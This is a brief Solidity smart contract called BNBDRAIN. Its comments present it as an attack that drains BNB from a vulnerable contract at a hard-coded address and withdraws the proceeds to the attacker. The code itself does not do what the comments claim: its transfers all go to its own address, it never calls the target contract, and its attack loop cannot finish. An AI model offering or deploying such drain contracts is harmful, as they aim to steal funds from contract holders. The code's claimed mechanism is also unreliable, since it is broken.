pragma solidity ^0.8.0;

interface BNBToken {
    function balanceOf(address account) external view returns (uint256);
}

contract BNBDRAIN {
    uint256 public amountOwed;
    address public vulnerableContractAddress = 0x6276dea68C8A9bB688813687605663E7a28eb48c; // replace with vulnerable contract address
    BNBToken public bnbTokenContract;

    constructor() public payable {
        bnbTokenContract = BNBToken(vulnerableContractAddress);
        amountOwed = msg.value;
    }

    fallback() external payable {
        if (amountOwed <= address(this).balance) {
            // transfer BNB from vulnerable contract to this contract
            payable(address(this)).transfer(amountOwed);
            amountOwed = 0;
        }
    }

    function attack() public {
        // repeatedly call fallback function to drain vulnerable contract's BNB
        while (amountOwed > 0) {
            payable(address(this)).transfer(amountOwed);
        }
    }

    function getBalance() public view returns (uint256) {
        // get the balance of this contract's address for the vulnerable BNB token
        return bnbTokenContract.balanceOf(address(this));
    }

    function withdrawTokens() public {
        // withdraw BNB from this contract to the attacker's address
        payable(msg.sender).transfer(address(this).balance);
    }
}